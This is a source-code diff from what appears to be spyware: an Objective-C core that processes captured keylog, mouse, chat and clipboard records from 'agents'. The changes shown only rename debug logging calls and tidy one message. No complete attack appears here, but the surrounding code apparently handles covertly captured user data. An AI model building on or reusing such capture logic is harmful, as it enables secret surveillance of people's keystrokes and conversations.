@@ -714,11 +714,11 @@ static void computerWillShutdown(CFMachPortRef port,
                                       withLogID: 0] == TRUE)
                   {
 #ifdef DEBUG_CORE
-                    warnLog(@"Log header agentID %x, status %x command size %d keylog %S", 
-                             shMemLog->agentID, 
-                             shMemLog->status,
-                             shMemLog->commandDataSize,
-                             shMemLog->commandData);
+                    verboseLog(@"Log header agentID %x, status %x command size %d keylog %S", 
+                               shMemLog->agentID, 
+                               shMemLog->status,
+                               shMemLog->commandDataSize,
+                               shMemLog->commandData);
                     verboseLog(@"header data size %d", sizeof(shMemoryLog));
 #endif
                   }
@@ -735,10 +735,10 @@ static void computerWillShutdown(CFMachPortRef port,
                                       withLogID: 0] == TRUE)
                 {
 #ifdef DEBUG_CORE
-                  infoLog(@"Log header agentID %x, status %x command size %d", 
-                          shMemLog->agentID, 
-                          shMemLog->status,
-                          shMemLog->commandDataSize);
+                  verboseLog(@"Log header agentID %x, status %x command size %d", 
+                             shMemLog->agentID, 
+                             shMemLog->status,
+                             shMemLog->commandDataSize);
                   verboseLog(@"header data size %lu", sizeof(shMemoryLog));
 #endif
                 }
@@ -748,7 +748,7 @@ static void computerWillShutdown(CFMachPortRef port,
             case AGENT_MOUSE:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Receveid mouse log");
+                verboseLog(@"Logs from mouse");
 #endif
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
@@ -1152,7 +1152,7 @@ static void computerWillShutdown(CFMachPortRef port,
             case AGENT_CHAT:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Logs from agent CHAT");
+                verboseLog(@"Logs from agent CHAT");
 #endif    
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
@@ -1176,7 +1176,7 @@ static void computerWillShutdown(CFMachPortRef port,
             case AGENT_CLIPBOARD:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Logs from clipboard");
+                verboseLog(@"Logs from clipboard");
 #endif
                 
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
@@ -1196,7 +1196,7 @@ static void computerWillShutdown(CFMachPortRef port,
             default:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Agent not yet implemented suckers: %d", shMemLog->agentID);
+                errorLog(@"Agent not yet implemented: %d", shMemLog->agentID);
 #endif
                 break;
               }
